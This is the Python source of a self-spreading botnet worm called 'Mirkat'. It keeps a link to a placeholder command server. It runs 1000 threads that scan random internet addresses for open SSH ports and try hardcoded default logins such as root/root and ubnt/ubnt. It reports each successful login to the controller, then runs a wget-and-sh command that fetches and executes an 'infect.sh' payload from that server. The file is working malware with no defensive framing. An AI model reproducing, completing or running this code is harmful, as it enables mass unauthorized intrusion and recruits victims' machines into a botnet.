import socket, time, threading, random, paramiko, os

__MT__, __FP__, __ST__ = ('_%_addr_%_', 6969), 1337, 1000

class Mirkat:
    def __init__(self):
        self.session: socket.socket= None
        self.connected = False
        self.packets_list = []

    def keep_alive(self):
        while True:
            time.sleep(5)

            if self.connected:
                try:
                    self.session.send('ping'.encode('utf-8'))
                except:
                    self.connected = False

            while not self.connected:
                try:
                    self.session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.session.connect(__MT__)
                    self.connected = True
                except:
                    pass
    
    def send_thread(self):
        while True:
            time.sleep(1)

            if self.connected:
                for packet in self.packets_list:
                    time.sleep(1)
                    send = False

                    while not send:
                        try:
                            self.session.send(packet.encode('utf-8'))
                            self.packets_list.remove(packet)
                            send = True
                        except:
                            self.connected = False

    def exec_thread(self):
        while True:
            if self.connected:
                data = self.sock.recv(4096).decode('utf-8').strip().split('\n')[0]

                if data not in ['', '\n']:
                    return data

    def attack_addr(self, addr: str):
        credentials = [
            ('root', 'adminlmao'),
            ('root', 'root'),
            ('root', 'admin'),
            ('cpsc', 'cpsc'),
            ('ubuntu', '123456'),
            ('ubnt', 'ubnt'),
            ('support', 'support')
        ]

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for credential in credentials:
            username= credential[0]
            password= credential[1]

            try:
                ssh.connect(addr, username= username, password= password)

                if password == 'adminlmao':
                    break

                stdin, stdout, stderr = ssh.exec_command(f'cat /proc/1')

                if str(stdout.read()).split('b\'')[1] != '':
                    self.packets_list.append(f'hit|{addr}:{username}:{password}')
                    ssh.exec_command(f'cd /tmp;wget {__MT__[0]}:{__FP__}/infect.sh && sh infect.sh')

            except Exception as e:
                if 'Authentication failed.' not in str(e):
                    break

    def scan(self):
        while True:
            try:
                p1, p2, p3, p4 = random.randrange(0, 255, 1), random.randrange(0, 255, 1), random.randrange(0, 255, 1), random.randrange(0, 255, 1)
                ip_addr = f'{p1}.{p2}.{p3}.{p4}'

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)

                try:
                    sock.connect((ip_addr, 22))
                    threading.Thread(target= self.attack_addr, args= (ip_addr, )).start()
                except:
                    pass
            except:
                pass

    def start(self):
        threading.Thread(target= self.keep_alive).start()
        threading.Thread(target= self.send_thread).start()
        
        for _ in range(__ST__):
            threading.Thread(target= self.scan).start()

try:
    os.system('sudo sysctl -w fs.file-max=100000;ulimit -n 999999')
except:
    pass
Mirkat().start()